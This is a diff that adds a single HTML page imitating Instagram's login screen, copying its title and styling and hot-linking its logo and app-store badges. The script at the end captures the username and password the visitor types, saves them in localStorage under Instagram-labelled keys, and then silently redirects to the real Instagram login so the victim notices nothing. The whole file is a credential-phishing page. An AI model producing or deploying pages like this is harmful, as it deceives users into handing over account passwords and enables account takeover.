@@ -1,1 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 350px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 10px 0;
+        }
+        .logo {
+            margin: 22px auto 12px;
+            height: 51px;
+            width: 175px;
+            background: url('https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png') no-repeat center;
+            background-size: contain;
+        }
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            margin: 0 40px;
+        }
+        .input-group {
+            position: relative;
+            margin: 8px 0;
+        }
+        .input-group input {
+            width: 100%;
+            height: 36px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 0 10px;
+            font-size: 14px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border: 1px solid #a2a2a2;
+        }
+        .login-button {
+            margin: 8px 0;
+            padding: 8px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .login-button:disabled {
+            background-color: #b2dffc;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 40px;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 15px;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .facebook-login {
+            display: flex;
+            justify-content: center;
+            margin: 8px 0;
+            font-size: 14px;
+            color: #385185;
+            font-weight: 600;
+        }
+        .facebook-login svg {
+            margin-right: 8px;
+            height: 16px;
+            width: 16px;
+        }
+        .forgot-password {
+            text-align: center;
+            margin: 12px 0;
+            font-size: 12px;
+            color: #00376b;
+        }
+        .signup {
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-top: 10px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .app-download {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .app-download a {
+            margin: 0 8px;
+        }
+        .app-download img {
+            height: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <form class="login-form" id="loginForm">
+            <div class="input-group">
+                <input type="text" name="username" id="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-button" id="loginButton">Log In</button>
+        </form>
+        <div class="divider">
+            <span>OR</span>
+        </div>
+        <div class="facebook-login">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+            </svg>
+            Log in with Facebook
+        </div>
+        <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+    <div class="container signup">
+        <div>Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+    <div class="app-download">
+        <p>Get the app.</p>
+        <div>
+            <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/english_badge_ios.png/6b91c71b8426.png" alt="App Store"></a>
+            <a href="#"><img src="https://www.instagram.com/static/images/googleplay-badge.png/6549fe85a7a7.png" alt="Google Play"></a>
+        </div>
+    </div>
 
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Store credentials in localStorage
+            localStorage.setItem('instagram_username', username);
+            localStorage.setItem('instagram_password', password);
+            
+            // Redirect to actual Instagram
+            window.location.href = 'https://www.instagram.com/accounts/login/';
+        });
+    </script>
+</body>
+</html>
